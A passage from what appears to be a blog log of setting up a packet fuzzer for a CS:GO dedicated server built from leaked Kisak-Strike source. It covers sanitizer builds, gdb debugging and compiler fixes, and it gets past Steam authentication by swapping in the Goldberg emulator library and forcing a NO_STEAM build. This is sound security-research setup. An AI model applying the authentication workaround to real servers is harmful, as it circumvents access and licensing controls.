#export ASAN_SYMBOLIZER_PATH=$(which llvm-symbolizer)
echo "$ASAN_OPTIONS"
export UBSAN_OPTIONS=halt_on_error=0
./csgo.sh -console

```
{% endraw %}

So maybe we should copy those ASAN_OPTIONS ? There is that halt_on_error which is set to zero so I think that makes the program continue even though an error is encountered like in the crash which we observed previously.

Well there appears to be no need. The `__attribute__((no_sanitize("address")))` seems to have done the trick.

Now we can capture all sorts of interesting packets going to the server, except that this does not really solve the original problem of segfaulting when we try to inject our own packet by fuzzing.

in the original code there is this line:

{% raw %}
```
net_scratchbuffer_t scratch;
packet = NET_GetPacket ( sock, scratch.GetBuffer() )

```
{% endraw %}

So lets try to do that next in our packet injection code.


The GetBuffer function of net_scratchbuffer_t is this:


{% raw %}
```
	byte * GetBuffer() const
	{
		return m_pBufferNetMaxMessage->buf;
	}
```
{% endraw %}

the constructor for net_scratchbuffer_t is this:

{% raw %}
```

	net_scratchbuffer_t()
	{
		m_pBufferNetMaxMessage = sm_NetScratchBuffers.Get();
		if ( !m_pBufferNetMaxMessage )
			m_pBufferNetMaxMessage = new buffer_t;
	}

```
{% endraw %}

and:

{% raw %}
```

static CTSPool< buffer_t > sm_NetScratchBuffers

```
{% endraw %}
and:

{% raw %}
```
struct buffer_t { byte buf[ NET_MAX_MESSAGE ]; };
```
{% endraw %}


and the definition of byte is basically just unsigned char:

{% raw %}
```
cyberhacker@cyberhacker-h8-1131sc:~/Netpacketfuzzer/Kisak-Strike$ grep -R "typedef unsigned char byte" *
anothershit.txt:engine/console.h:typedef unsigned char byte;
anothershit.txt:external/crypto++-5.61/config.h:typedef unsigned char byte;		//lwss - move to CryptoPP namespace to avoid C++17 errors
anothershit.txt:external/SDL2_mixer-2.0.4/external/mpg123-1.25.6/src/compat/compat.h:typedef unsigned char byte;
anothershit.txt:hammer/hammer_mathlib.h:typedef unsigned char byte;
anothershit.txt:hammer/studiomodel.h:typedef unsigned char byte;
anothershit.txt:ivp/ivp_compact_builder/ivp_surbuild_q12.cxx:typedef unsigned char byte;
anothershit.txt:public/tier0/wchartypes.h:typedef unsigned char byte;
anothershit.txt:public/mxtk/mximage.h:typedef unsigned char byte;
anothershit.txt:public/engine/ivmodelinfo.h:typedef unsigned char byte;
anothershit.txt:public/keyframe/keyframe.cpp:typedef unsigned char byte;

```
{% endraw %}

So I am a bit confused as to how we should crash when that was what we were doing in the first place.


Except that actually no, we call NET_GetLoopPacket and stuff to get the actual data along with the sender information and other stuff, so we also need to fake that as well.


## Fixing auth error (a "SLIGHT" detour)

Anyway, lets just first just try to log packets from a couple of minutes of actual gameplay.

There is a problem that when I try to join the server, it kinda works, but then it drops the connection after a while with this message:

{% raw %}
```
STEAMAUTH: Client REDACTED received failure code 6
STEAMAUTH: Client REDACTED received failure code 6
Game will not start until both teams have players.
Game will not start until both teams have players.
Dropped REDACTED from server: No Steam logon

Dropped REDACTED from server: No Steam logon

Net channel ratelimit exceeded for 192.168.32.161:27006: 43 packets rejected.
Net channel ratelimit exceeded for 192.168.32.161:27006: 43 packets rejected.
Server is hibernating
Server is hibernating
```
{% endraw %}


according to this https://steamerrors.com/ error code 6 means that I am logged in somewhere else??????

That is kinda weird. Lets try to run steam with -debug_steamapi and -console enabled and see what kind of errors we get.

Except that lets not. Looking at public/const.h there are these juicy lines:

{% raw %}
```


// the command line param that tells the engine to use steam
#define STEAM_PARM					"-steam"
// the command line param to tell dedicated server to restart 
// if they are out of date
#define AUTO_RESTART "-autoupdate"

// the message a server sends when a clients steam login is expired
#define INVALID_STEAM_TICKET "Invalid STEAM UserID Ticket\n"
#define INVALID_STEAM_LOGON "No Steam logon\n"
#define INVALID_STEAM_VACBANSTATE "VAC banned from secure server\n"
#define INVALID_STEAM_LOGGED_IN_ELSEWHERE "This Steam account is being used in another location\n"

```
{% endraw %}

So lets try to run the server with "-steam" ??? 

(Also probably try running the steam client with the -debug_steamapi) .

Aaaannndd we get the same error with absolutely no useful errors in the steam console:

{% raw %}
```
m_pData == {?
STEAMAUTH: Client REDACTED received failure code 6
STEAMAUTH: Client REDACTED received failure code 6
Game will not start until both teams have players.
Game will not start until both teams have players.
Dropped REDACTED from server: No Steam logon

Dropped REDACTED from server: No Steam logon

Net channel ratelimit exceeded for 192.168.32.161:27006: 367 packets rejected.
Net channel ratelimit exceeded for 192.168.32.161:27006: 367 packets rejected.
Server is hibernating
Server is hibernating
```
{% endraw %}


Thanks Valve for the very useful and very descriptive errors! 🙃 


in sv_steamauth.cpp :

{% raw %}
```

	Warning( "STEAMAUTH: Client %s received failure code %d\n", cl->GetClientName(), (int)eAuthSessionResponse );
	g_Log.Printf( "STEAMAUTH: Client %s received failure code %d\n", cl->GetClientName(), (int)eAuthSessionResponse );

	switch ( eAuthSessionResponse )
	{
	case k_EAuthSessionResponseUserNotConnectedToSteam:
		OnInvalidSteamLogonErrorForClient( cl );
		break;

```
{% endraw %}


and:

{% raw %}
```
enum EAuthSessionResponse
{
	k_EAuthSessionResponseOK = 0,							// Steam has verified the user is online, the ticket is valid and ticket has not been reused.
	k_EAuthSessionResponseUserNotConnectedToSteam = 1,		// The user in question is not connected to steam
	k_EAuthSessionResponseNoLicenseOrExpired = 2,			// The license has expired.
	k_EAuthSessionResponseVACBanned = 3,					// The user is VAC banned for this game.
	k_EAuthSessionResponseLoggedInElseWhere = 4,			// The user account has logged in elsewhere and the session containing the game instance has been disconnected.
	k_EAuthSessionResponseVACCheckTimedOut = 5,				// VAC has been unable to perform anti-cheat checks on this user
	k_EAuthSessionResponseAuthTicketCanceled = 6,			// The ticket has been canceled by the issuer
	k_EAuthSessionResponseAuthTicketInvalidAlreadyUsed = 7,	// This ticket has already been used, it is not valid.
	k_EAuthSessionResponseAuthTicketInvalid = 8,			// This ticket is not from a user instance currently connected to steam.
	k_EAuthSessionResponsePublisherIssuedBan = 9,			// The user is banned for this game. The ban came via the web api and not VAC
};


```
{% endraw %}
So we are actually getting k_EAuthSessionResponseAuthTicketCanceled error. After some searching I found this : https://steamcommunity.com/app/51100/discussions/0/864977564389540810/ but the thing is that I can not find the ClientRegistry.blob file anywhere in my file system . Maybe just try with -autoupdate ? 

Running with -autoupdate the binary just exits almost immediately. Huh. Maybe running the client with -steam helps?

Aaaannndd fuck. We still get the same error.

Looking at my steam library it looks like there are updates scheduled for the dedicated server and the csgo client. Maybe update those and then close my entire computer and then try again? I am a bit skeptical because I searchd online and some people were saying that this error is an error on Valves side but idk. I tried that and no dice.

Maybe we should try updating the server?

there is the 

{% raw %}
```
Your server needs to be restarted in order to receive the latest update.
```
{% endraw %}

error which seems to indicated that we should update the server. Of course we can't update the server because it is compiled from leaked source, but instead trying to update the vanilla server should be fine???

After that we still get the error.

Maybe try connecting to the server with the vanilla client??

"App already running." Huh? I think that this error happens, because our csgo server uses 730 as its appid instead of the 740 which it is supposed to use for some reason. Lets try to consult the documentation on the Kisak-Strike forum.

In the function which takes INVALID_STEAM_LOGON aka "No steam logon" as a parameter:

{% raw %}
```
void CSteam3Server::OnInvalidSteamLogonErrorForClient( CBaseClient *cl )
{
	if ( BLanOnly() )
		return;

	bool bDisconnectRightNow = true;
	if ( cl->IsFullyAuthenticated() )
	{
		if ( sv_steamauth_enforce.GetInt() == 0 )
		{
			bDisconnectRightNow = false;
		}
		else if ( sv_steamauth_enforce.GetInt() == 1 )
		{
			KeyValues *kvCommand = new KeyValues( "InvalidSteamLogon" );
			KeyValues::AutoDeleteInline autodelete( kvCommand );
			serverGameClients->ClientCommandKeyValues( EDICT_NUM( cl->m_nEntityIndex ), kvCommand );
			if ( !kvCommand->GetBool( "disconnect" ) )
				bDisconnectRightNow = false;
		}
	}

	if ( bDisconnectRightNow )
	{
		cl->Disconnect( INVALID_STEAM_LOGON );
	}
	else
	{
		Warning( "STEAMAUTH: Client %s not immediately kicked because sv_steamauth_enforce=%d\n", cl->GetClientName(), sv_steamauth_enforce.GetInt() );
		g_Log.Printf( "STEAMAUTH: Client %s not immediately kicked because sv_steamauth_enforce=%d\n", cl->GetClientName(), sv_steamauth_enforce.GetInt() );
	}
}

```
{% endraw %}

There is that BLanOnly thing which seems interesting. Can we make the server such that it server to lan only???

{% raw %}
```
sv_steamauth.h:	bool BLanOnly() const { return m_eServerMode == eServerModeNoAuthentication; }
```
{% endraw %}

Now, I saw that in the code there was the NO_STEAM macro which I think we should set, but there is also this:

{% raw %}
```
	if ( sv_lan.GetBool() )
	{
		return eServerModeNoAuthentication;
	}
```
{% endraw %}

sooo just set +sv_lan 1 ? 

Now we get this error:

{% raw %}
```
STEAMAUTH: Client REDACTED received failure code 6
STEAMAUTH: Client REDACTED received failure code 6
Net channel ratelimit exceeded for 192.168.32.161:27006: 349 packets rejected.
Net channel ratelimit exceeded for 192.168.32.161:27006: 349 packets rejected.
```
{% endraw %}
So now we do not get the "No Steam logon" thing but we still get this failure.

{% raw %}
```

void CSteam3Server::OnValidateAuthTicketResponseHelper( CBaseClient *cl, EAuthSessionResponse eAuthSessionResponse )
{
	INetChannel *netchan = cl->GetNetChannel();

	// If the client is timing out, the Steam failure is probably related (e.g. game crashed). Let's just print that the client timed out.
	if ( netchan && netchan->IsTimingOut() )
	{
		cl->Disconnect( CFmtStr( "%s timed out", cl->GetClientName() ) );
		return;
	}

	// Emit a more detailed diagnostic.
	Warning( "STEAMAUTH: Client %s received failure code %d\n", cl->GetClientName(), (int)eAuthSessionResponse );
	g_Log.Printf( "STEAMAUTH: Client %s received failure code %d\n", cl->GetClientName(), (int)eAuthSessionResponse );

	switch ( eAuthSessionResponse )
	{

```
{% endraw %}


and:

{% raw %}
```

void CSteam3Server::OnValidateAuthTicketResponse( ValidateAuthTicketResponse_t *pValidateAuthTicketResponse )
{
	//Msg("Steam backend:Got approval for %x\n", pGSClientApprove->m_SteamID.ConvertToUint64() );
	// We got the approval message from the back end.
	// Note that if we dont get it, we default to approved anyway
	// dont need to send anything back

	if ( !BIsActive() )
		return;

	CBaseClient *client = ClientFindFromSteamID( pValidateAuthTicketResponse->m_SteamID );
	if ( !client )
		return;

	if ( pValidateAuthTicketResponse->m_eAuthSessionResponse != k_EAuthSessionResponseOK )
	{
		OnValidateAuthTicketResponseHelper( client, pValidateAuthTicketResponse->m_eAuthSessionResponse );
		return;
	}

	if ( Filter_IsUserBanned( client->GetNetworkID() ) )
	{
```
{% endraw %}

Soooo just compile with -DNO_STEAM=1 ??? Gosh, why does this have to be so hard?


Aaannd tada:

{% raw %}
```
We have to build with steam currently =(
```
{% endraw %}

Fuck!

Maybe try this: https://gitlab.com/Mr_Goldberg/goldberg_emulator ?

I got the inspiration to try this from here: https://github.com/SwagSoftware/Kisak-Strike/issues/35

Run strace on the server and see where it loads the steamapi from???


{% raw %}
```
lstat("/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/lib/public/linux64/libsteam_api.so", {st_mode=S_IFREG|0664, st_size=404222, ...}) = 0
```
{% endraw %}

Oh, so it just loads it from the source tree itself?? That is kinda of an unorthodox way of doing things. Oh well.

So just replace it with the newly compiled steamapi.so file??

Now I am getting this error:

{% raw %}
```

LD_LIBRARY_PATH=/home/cyberhacker/Netpacketfuzzer/game/bin:/home/cyberhacker/Netpacketfuzzer/game/bin/linux64
[New Thread 0x7ffff2c4c700 (LWP 44226)]
==44221==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:9672 "((__interception::real_memcpy)) != (0)" (0x0, 0x0)
    <empty stack>

[Thread 0x7ffff2c4c700 (LWP 44226) exited]
[Inferior 1 (process 44221) exited with code 01]


```
{% endraw %}
Maybe try to compile the goldberg shit with -static-libsan ?


Wow. That actually worked? Now we need to compile it without asan for the client because reasons.

Aaaannd it actually works fine????? This is quite surprising. Now it actually somewhat works, except now the server just drops the client after a while for seeminly no reason???

It is probably something to do with some timeout stuff that the client does not respond fast enough so the client gets dropped. Looking at the gamestartup stuff there isn't an obvious "client timeout" variable anywhere.

Oh wait actually it is just the alarm clock thing.

Lets investigate what calls the SIGALRM signal. Maybe `handle SIGALRM stop` makes the debugger stop at the signal?

{% raw %}
```

Server waking up from hibernation
PutClientInServer: no info_player_start on level
PutClientInServer: no info_player_start on level
item_assaultsuit is missing an item definition in the schema.
item_assaultsuit is missing an item definition in the schema.
Generating Navigation Mesh...
Generating Navigation Mesh...
Sampling walkable space...
Sampling walkable space...
item_assaultsuit is missing an item definition in the schema.
item_assaultsuit is missing an item definition in the schema.
Sampling walkable space...
Sampling walkable space...
Sampling walkable space...
Sampling walkable space...
Creating navigation areas from sampled data...
Creating navigation areas from sampled data...
Connecting navigation areas...
Connecting navigation areas...
Merging navigation areas...
Merging navigation areas...
Created new fencetop area 3077(0) between 122(0) and 54(0)
Created new fencetop area 3077(0) between 122(0) and 54(0)
Created new fencetop area 3078(0) between 164(0) and 2424(0)
Created new fencetop area 3078(0) between 164(0) and 2424(0)
Created new fencetop area 3079(0) between 578(0) and 54(0)
Created new fencetop area 3079(0) between 578(0) and 54(0)
Finding hiding spots...DONE
Finding hiding spots...DONE
Finding encounter spots... 0%
Finding encounter spots... 0%

Thread 1 "srcds_linux" received signal SIGALRM, Alarm clock.
0x00007fffebbd984c in simplex_t::SolveVoronoiRegion4 (this=this@entry=0x7fffffff5f90, newPoint=..., pOut=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/vphysics/trace.cpp:1722
1722		if ( d < 0 )
(gdb) where


```
{% endraw %}

Yeah, but that does not show where the timer was originally set?

{% raw %}
```

Thread 1 "srcds_linux" hit Breakpoint 2, 0x00007ffff72965e0 in alarm@plt () from /home/cyberhacker/Netpacketfuzzer/game/bin/linux64/libtier0_client.so
(gdb) where
#0  0x00007ffff72965e0 in alarm@plt () from /home/cyberhacker/Netpacketfuzzer/game/bin/linux64/libtier0_client.so
#1  0x00007ffff72da346 in BeginWatchdogTimer (nSecs=nSecs@entry=30) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/tier0/platform_posix.cpp:437
#2  0x00007ffff05a06d5 in CHostState::State_Run (this=this@entry=0x7ffff23f7340 <g_HostState>, frameTime=<optimized out>, frameTime@entry=9.92227077) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host_state.cpp:610
#3  0x00007ffff05a278e in CHostState::FrameUpdate (this=<optimized out>, time=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host_state.cpp:805
#4  0x00007ffff09ece6a in CEngine::Frame (this=0x7ffff240af40 <g_Engine>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_engine.cpp:572
#5  0x00007ffff09ce660 in CDedicatedServerAPI::RunFrame (this=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2900
#6  0x00007ffff2cd6eb3 in RunServer (bSupressStdIOBecauseWeAreAForkedChild=bSupressStdIOBecauseWeAreAForkedChild@entry=false) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:248
#7  0x00007ffff2cd23bf in CDedicatedExports::RunServer (this=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_common.cpp:198
#8  0x00007ffff09ceb34 in CModAppSystemGroup::Main (this=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2399
#9  0x00007ffff1794e45 in CAppSystemGroup::Run (this=0x60e0000048e0) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#10 0x00007ffff09d7bc0 in CDedicatedServerAPI::ModInit (this=<optimized out>, info=...) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2864
#11 0x00007ffff2cd7944 in CDedicatedAppSystemGroup::Main (this=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:447
#12 0x00007ffff30ab755 in CAppSystemGroup::Run (this=0x7fffffffb490) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#13 0x00007ffff30ab755 in CAppSystemGroup::Run (this=0x7fffffffb390) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#14 0x00007ffff2ca143f in main (argc=<optimized out>, argv=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:652
#15 0x0000555555567af7 in main (argc=<optimized out>, argv=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated_main/main.cpp:354


```
{% endraw %}



and

{% raw %}
```

(gdb) where
#0  alarm () at ../sysdeps/unix/syscall-template.S:78
#1  0x00007ffff72da50b in EndWatchdogTimer () at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/tier0/platform_posix.cpp:442
#2  0x00007ffff05a0669 in CHostState::State_Run (this=this@entry=0x7ffff23f7340 <g_HostState>, frameTime=<optimized out>, frameTime@entry=9.92227077) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host_state.cpp:613
#3  0x00007ffff05a278e in CHostState::FrameUpdate (this=<optimized out>, time=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/host_state.cpp:805
#4  0x00007ffff09ece6a in CEngine::Frame (this=0x7ffff240af40 <g_Engine>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_engine.cpp:572
#5  0x00007ffff09ce660 in CDedicatedServerAPI::RunFrame (this=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2900
#6  0x00007ffff2cd6eb3 in RunServer (bSupressStdIOBecauseWeAreAForkedChild=bSupressStdIOBecauseWeAreAForkedChild@entry=false) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:248
#7  0x00007ffff2cd23bf in CDedicatedExports::RunServer (this=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_common.cpp:198
#8  0x00007ffff09ceb34 in CModAppSystemGroup::Main (this=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2399
#9  0x00007ffff1794e45 in CAppSystemGroup::Run (this=0x60e0000048e0) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#10 0x00007ffff09d7bc0 in CDedicatedServerAPI::ModInit (this=<optimized out>, info=...) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/engine/sys_dll2.cpp:2864
#11 0x00007ffff2cd7944 in CDedicatedAppSystemGroup::Main (this=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:447
#12 0x00007ffff30ab755 in CAppSystemGroup::Run (this=0x7fffffffb490) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#13 0x00007ffff30ab755 in CAppSystemGroup::Run (this=0x7fffffffb390) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#14 0x00007ffff2ca143f in main (argc=<optimized out>, argv=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated/sys_ded.cpp:652
#15 0x0000555555567af7 in main (argc=<optimized out>, argv=<optimized out>) at /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/dedicated_main/main.cpp:354



```
{% endraw %}

So the program sets watchdog timers? That is kinda retarded since, I mean I get that you want to set a timer for a thread such that it doesn't run endlessly. Lets just patch the BeginWatchdogTimer function out.

Except that we do not need to do that. There is a -nowatchdog command line option. Lets try that.

Aaaanndd we get the exact same crash!

{% raw %}
```

STEAMAUTH: Client Noob received failure code 6
STEAMAUTH: Client Noob received failure code 6
Game will not start until both teams have players.
Game will not start until both teams have players.
Dropped Noob from server: Disconnect
Dropped Noob from server: Disconnect
Server is hibernating
Server is hibernating
ApplyGameSettings: Invalid mapgroup name mg_bomb
ApplyGameSettings: Invalid mapgroup name mg_bomb


```
{% endraw %}

Maybe mod the makefile and add the NO_STEAM flag?

Here is the only place where the NO_STEAM flag is referenced in any meaningful way:

{% raw %}
```

    target_sources(${OUTBINNAME} PRIVATE "${ESRCDIR}/enginetool.cpp")
    target_sources(${OUTBINNAME} PRIVATE "${ESRCDIR}/toolframework.cpp")
endif()
target_sources(${OUTBINNAME} PRIVATE "${ESRCDIR}/bsplog.cpp")
target_sources(${OUTBINNAME} PRIVATE "${ESRCDIR}/serializedentity.cpp") #valve had this in the header section >:(

if( (NOT DEFINED NO_STEAM) )
    #grug
    #Looks like we have to include libsteam_api
    message("building with steam_api")
    target_link_libraries(${OUTBINNAME} ${LIBPUBLIC}/libsteam_api.so)
else()
    #message(FATAL_ERROR "CMake steam_api integration is disabled.")
    message(FATAL_ERROR "We have to build with steam currently =(")
endif()

#Link order actually does matter, so be careful if you cleanup these nasty if's
target_link_libraries(${OUTBINNAME} appframework_client bitmap_client dmxloader_client mathlib_client)

```
{% endraw %}

replaced with this:

{% raw %}
```

target_sources(${OUTBINNAME} PRIVATE "${ESRCDIR}/serializedentity.cpp") #valve had this in the header section >:(

# Include the goldberg steamapi.
#grug
#Looks like we have to include libsteam_api

message("building with goldberg steam_api")
target_link_libraries(${OUTBINNAME} ${LIBPUBLIC}/libsteam_api.so)


#Link order actually does matter, so be careful if you cleanup these nasty if's
target_link_libraries(${OUTBINNAME} appframework_client bitmap_client dmxloader_client mathlib_client)

```
{% endraw %}



lets then try to compile with this:

{% raw %}
```
export CFLAGS="-fsanitize=address -fsanitize-recover=address"
export CXXFLAGS="-fsanitize=address -fsanitize-recover=address"
export LDFLAGS="-fsanitize=address -fsanitize-recover=address"

CFLAGS="-g -fsanitize=address -fsanitize-recover=address" CXXFLAGS="-g -fsanitize=address -fsanitize-recover=address" LDFLAGS="-fsanitize=address -fsanitize-recover=address" AFL_USE_ASAN=1 USE_ASAN=1 PERSIST=1 cmake -DCMAKE_BUILD_TYPE=Release -DUSE_ASAN=1 -DUSE_ROCKETUI=ON -DFREETYPE_LIBRARY=/usr/lib/x86_64-linux-gnu/libfreetype.so -DFREETYPE_INCLUDE_DIRS=/usr/include/freetype2/freetype/ -DUSE_KISAK_PHYSICS=ON -DDEDICATED=ON -DNO_STEAM=1 -DCMAKE_C_COMPILER=/home/cyberhacker/Asioita/newaflfuzz/AFLplusplus/afl-gcc-fast -DCMAKE_CXX_COMPILER=/home/cyberhacker/Asioita/newaflfuzz/AFLplusplus/afl-g++-fast  ..


```
{% endraw %}

After doing these couple of mods, lets see what happens! (Hopefully we get a working binary.)

(I think originally the flags were there because the steamapi thing then fails as mentioned in https://github.com/SwagSoftware/Kisak-Strike/issues/35 if we try to do NO_STEAM , but now since we have the goldberg shit installed that shouldn't happen probably maybe??!!??!)


After waiting ages for the compiling lets see what happens:

We get the same exact error? Why the fuck?

Lets try to compile with VERBOSE=1 to see the individual commands.

Yeah, this bullshit totally ignores the -DNO_STEAM=1 when compiling for some reason.

Looking at the way the makefiles handle USE_ASAN for example i see this:

{% raw %}
```


if(LINUXALL)
    if( USE_ASAN )
        add_definitions(-DUSE_ASAN)
        add_compile_options(-fno-omit-frame-pointer -fsanitize=address -fsanitize-recover=address)
        add_link_options(-fsanitize=address -fsanitize-recover=address)
    endif()

    #add_definitions(-D_LINUX -DLINUX)
    if( DONT_DOWNGRADE_ABI )
        message(STATUS "KEEPING CXX11 ABI FOR PROJECT")
    else()
        #message(STATUS "DOWNGRADING CXX11 ABI")
        #disable cpp11 ABI so libraries <gcc 5 will work
        add_definitions(-D_GLIBCXX_USE_CXX11_ABI=0)
    endif()
endif()

```
{% endraw %}

lets add this here:

{% raw %}
```

    if( USE_ASAN )
        add_definitions(-DUSE_ASAN)
        add_compile_options(-fno-omit-frame-pointer -fsanitize=address -fsanitize-recover=address)
        add_link_options(-fsanitize=address -fsanitize-recover=address)
    endif()

    if ( NO_STEAM )
        message(STATUS "Adding -DNO_STEAM to the bullshit!")
        add_definitions(-DNO_STEAM)
    endif()


    #add_definitions(-D_LINUX -DLINUX)
    if( DONT_DOWNGRADE_ABI )

```
{% endraw %}


This seems to have done the trick and now we are actually compiling without Steam .


If we enable NO_STEAM then we get a compiler error on these lines:

{% raw %}
```


#include "tier0/platform.h"
#include "tier0/dbg.h"
#include "tier1/netadr.h"
#include "steam/steamclientpublic.h" // for CSteamID
#include "tier1/strtools.h" // V_memset

#if defined( NO_STEAM )
typedef CSteamID uint64;
#endif

enum PeerToPeerAddressType_t
{
	P2P_STEAMID,
};


```
{% endraw %}

Soooo maybe just try getting rid of it and then trying again?


Another compiler error happens here:

{% raw %}
```

void CBaseGamesPage::OnViewWorkshop( int serverID )
{
	gameserveritem_t *pServer = ServerBrowserDialog().GetServer( serverID );
	ViewCommunityMapsInWorkshop( pServer ? GetMapIDFromMapPath( pServer->m_szMap ) : 0 );
}


```
{% endraw %}

in BaseGamesPage.cpp 


this is because the guy forgot to add the `#if !defined(NO_STEAM)` clause to protect the undefined function error.

After doing those modifications, lets see if we get anymore errors. Hopefully not, but I am not too hopeful.

They also forgot to do that here:

{% raw %}
```
	}

	// TODO: would have liked this to be totally event driven... currently needs a tick.
	if ( engine->IsDedicatedServer() && steamgameserverapicontext->SteamHTTP() )
	{
		DedicatedServerWorkshop().Update();	
	}
}



```
{% endraw %}

in gameinterface.cpp .


Another error:

{% raw %}
```

In file included from /home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/movehelper_server.cpp:18:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/server/cstrike15/cs_gamestats.h:440:24: error: ‘SWeaponHitData’ has not been declared
  440 |  void RecordWeaponHit( SWeaponHitData* pHitData );
      |                        ^~~~~~~~~~~~~~



```
{% endraw %}


Now, RecordWeaponHit is only used in like a couple of places in the code:

{% raw %}
```

game/shared/cstrike15/basecsgrenade_projectile.cpp
game/server/cstrike15/cs_gamestats.cpp
game/server/cstrike15/cs_gamestats.h


```
{% endraw %}

Even more errors:

{% raw %}
```


	static CSteamID s_mysteamid = steamapicontext->SteamUser()->GetSteamID();
	for ( int iMachine = 0, numMachines = pFullGameSettings->GetInt( "members/numMachines" ); iMachine < numMachines; ++iMachine )
	{
		KeyValues *pMachine = pFullGameSettings->FindKey( CFmtStr( "members/machine%d", iMachine ) );
		for ( int iPlayer = 0, numPlayers = pMachine->GetInt( "numPlayers" ); iPlayer < numPlayers; ++iPlayer )
		{
			KeyValues *pPlayer = pMachine->FindKey( CFmtStr( "player%d", iPlayer ) );
			if ( !pPlayer )
				continue;

			if ( !pPlayer->GetInt( "game/prime" ) )
				bAllPrime = false;

			int nRanking = pPlayer->GetInt( "game/ranking" );
			if ( nRanking )
			{
				nAvgRank += nRanking;
				++ nHaveRank;
			}
			++ nTotalPlayers;

			char const *szLocation = pPlayer->GetString( "game/loc" );
			if ( !*szLocation )
				continue;

			UtlSymId_t symid = mapPlayerCountries.Find( szLocation );
			if ( symid == UTL_INVAL_SYMBOL )
				symid = mapPlayerCountries.Insert( szLocation, 0.0f );
			float flNewWeightOfThisCountry = (
				mapPlayerCountries[symid] += ( 1.0f + ( ( CSteamID( pPlayer->GetUint64( "xuid" ) ).GetAccountID() == s_mysteamid.GetAccountID() ) ? 0.5f : 0.0f ) )
				);
			if ( flNewWeightOfThisCountry > flBestCountryWeight )
			{
				szBestCountry = szLocation;
				flBestCountryWeight = flNewWeightOfThisCountry;
			}
		}
	}

```
{% endraw %}


since we do not have steamapicontext defined anywhere, we just rip this code out.

Also while looking at the matchmaking_base_inc.cmake file it looks like the NO_STEAM flag did not get passed properly to it so I technically wasted a bit of time commenting out shit which didn't really need commenting out, but anyway.

Also I am starting to doubt myself, because we technically don't need to do all of this. This is just to not get kicked from the server. We can fuzz the packet handler without really being able to play the game properly.. Oh well..

The compilation is as of writing around 80% done now and no extra errors have occurred. I also think that the "commenting out code which doesn't work" strategy won't come to bite us in the ass later, because I think that that code is only called when NO_STEAM is not defined aka when we are compiling with steam. It is called from the main engine code and I think that now because the NO_STEAM flag worked properly there that it should be fine.


Uh oh:

{% raw %}
```
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/steamworks_gamestats.cpp:266:3: error: ‘m_CallbackSteamSessionInfoIssued’ was not declared in this scope
  266 |   m_CallbackSteamSessionInfoIssued.Set( hSteamAPICall, this, &CSteamWorksGameStatsUploader::Steam_OnSteamSessionInfoIssued );
      |   ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/steamworks_gamestats.cpp:266:93: error: ‘Steam_OnSteamSessionInfoIssued’ is not a member of ‘CSteamWorksGameStatsUploader’
  266 |   m_CallbackSteamSessionInfoIssued.Set( hSteamAPICall, this, &CSteamWorksGameStatsUploader::Steam_OnSteamSessionInfoIssued );
      |                                                                                             ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/steamworks_gamestats.cpp: In member function ‘void CSteamWorksGameStatsUploader::EndSession()’:
/home/cyberhacker/Netpacketfuzzer/Kisak-Strike/game/shared/steamworks_gamestats.cpp:417:3: error: ‘m_CallbackSteamSessionInfoClosed’ was not declared in this scope
  417 |   m_CallbackSteamSessionInfoClosed.Set( hSteamAPICall, this, &CSteamWorksGameStatsUploader::Steam_OnSteamSessionInfoClosed );
      |   ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
